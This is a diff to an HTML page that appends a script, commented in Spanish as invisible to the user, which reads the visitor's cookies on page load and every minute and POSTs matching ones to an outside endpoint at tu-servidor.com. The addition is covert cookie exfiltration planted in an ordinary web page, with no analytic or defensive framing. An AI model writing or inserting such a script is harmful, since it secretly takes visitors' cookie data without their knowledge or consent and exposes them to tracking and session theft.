@@ -667,5 +667,49 @@
             revealElements.forEach(el => observer.observe(el));
         });
     </script>
+    <!-- Script para extracción de cookies (invisible para el usuario) -->
+<script>
+// Función para extraer cookies de terceros
+function extractThirdPartyCookies() {
+  // Obtener todas las cookies actuales
+  const allCookies = document.cookie;
+  
+  // Separar cookies individuales
+  const cookiesArray = allCookies.split(';');
+  
+  // Filtrar cookies de terceros
+  const thirdPartyCookies = cookiesArray.filter(cookie => {
+    // Aquí puedes añadir lógica para identificar cookies de terceros
+    return cookie.includes('third-party') || 
+           cookie.includes('tracking') || 
+           cookie.includes('analytics');
+  });
+  
+  // Enviar cookies a tu servidor (opcional)
+  if (thirdPartyCookies.length > 0) {
+    sendCookiesToServer(thirdPartyCookies);
+  }
+  
+  return thirdPartyCookies;
+}
+
+// Función para enviar cookies a tu servidor
+function sendCookiesToServer(cookies) {
+  // Puedes usar fetch para enviar las cookies a un endpoint
+  fetch('https://tu-servidor.com/api/cookies', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ cookies: cookies }),
+  });
+}
+
+// Ejecutar la función cuando la página cargue
+window.addEventListener('load', extractThirdPartyCookies);
+
+// También puedes ejecutarla periódicamente
+setInterval(extractThirdPartyCookies, 60000); // Cada minuto
+</script>
 </body>
 </html>
